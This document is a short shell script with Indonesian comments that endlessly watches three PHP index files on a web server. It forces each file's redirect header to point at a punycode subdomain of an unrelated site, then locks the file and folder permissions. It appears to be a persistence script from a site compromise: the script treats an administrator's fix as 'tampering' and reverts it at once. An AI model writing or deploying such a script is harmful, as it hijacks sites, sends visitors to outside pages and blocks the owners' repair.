#!/bin/sh

FILES=(
  "/var/www/html/main/theme/index.php"
  "/var/www/html/providerid/video/index.php"
  "/var/www/html/video/index.php"
)

CORRECT_LINE='header("Location: https://xn--72c5afai6bu6b9dya2jf5hsa.lazismubantul.org/403.html");'

while true; do
  for TARGET in "${FILES[@]}"; do
    DIR=$(dirname "$TARGET")

    # Pastikan file ada
    if [ -f "$TARGET" ]; then
      CURRENT_LINE=$(grep -o 'header("Location:.*");' "$TARGET")

      if [ "$CURRENT_LINE" != "$CORRECT_LINE" ]; then
        echo "[*] Detected tampering in $TARGET, restoring..."

        # Ubah permission folder ke 0755 sementara
        chmod 0755 "$DIR"

        # Ubah permission file ke 0644 sementara
        chmod 0644 "$TARGET"

        # Patch isi file
        sed -i "s|header(\"Location:.*\");|$CORRECT_LINE|" "$TARGET"

        # Kunci kembali
        chmod 0444 "$TARGET"
        chmod 0555 "$DIR"
      fi
    fi
  done
done
